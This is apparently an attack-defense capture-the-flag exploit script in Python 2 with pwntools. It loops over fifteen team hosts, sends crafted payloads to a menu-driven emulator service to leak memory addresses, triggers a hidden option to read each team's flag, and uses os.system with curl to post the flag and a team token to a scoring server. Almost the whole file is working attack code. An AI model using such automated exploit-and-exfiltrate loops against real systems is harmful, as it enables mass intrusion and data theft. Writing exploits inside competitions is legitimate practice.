#!/usr/bin/env python
from pwn import *


host , port = '10.0.15.1' , 9487
#y = remote( host , port )


import os

token = '294d34acf11783a50f0fe3a51db8aef4'


def new( size , data ):
    y.sendlineafter( 'exit' , '0' )
    y.sendlineafter( 'size?' , str( size ) )
    y.sendafter( 'data?' , data )


def ins():
    y.sendlineafter( 'exit' , '1' )

def dis():
    y.sendlineafter( 'exit' , '2' )

def emu( sys , data ):
    y.sendlineafter( 'exit' , '3' )
    y.sendlineafter( '?' , str( sys ) )
    y.sendlineafter( '?' , data )


def a1():
    y.sendlineafter( 'exit' , '1337' )

def b1():
    y.sendlineafter( 'exit' , '5566' )


for i in range(1 , 16):
    host , port = '10.0.' + str( i ) + '.1' , 9487
    y = remote( host , port )

    try:
        new( 16, p64( 0xa002010030 ) + p64( 0x16 ) )
    except:
        y.close()
        continue

    a1()

    emu( 0 , '1\n2\n3\n4\n5\n6' )

    try:
        y.recvuntil( '0x' )
    except:
        y.close()
        continue
    a = int( y.recvuntil(')')[:-1] , 16)
    log.success( 'a -> %s' % hex( a ) )

    new( 16, p64( 0xa402010030 ) + p64( 0x16 ) )

    emu( 0 , '1\n2\n3\n4\n5\n6' )

    y.recvuntil( '0x' )
    b = int( y.recvuntil(')')[:-1] , 16)
    log.success( 'b -> %s' % hex( b ) )

    print hex( a & 0xfffff000 )

    new( 8 , p32( a & 0xfffff000 ) + p32( b ) )

    b1()

    print y.recvline()

    flag = y.recvall()

    print flag

    os.system("curl 'http://10.10.10.1/team/submit_key?token={}&key={}'".format(token,flag))

#y.interactive()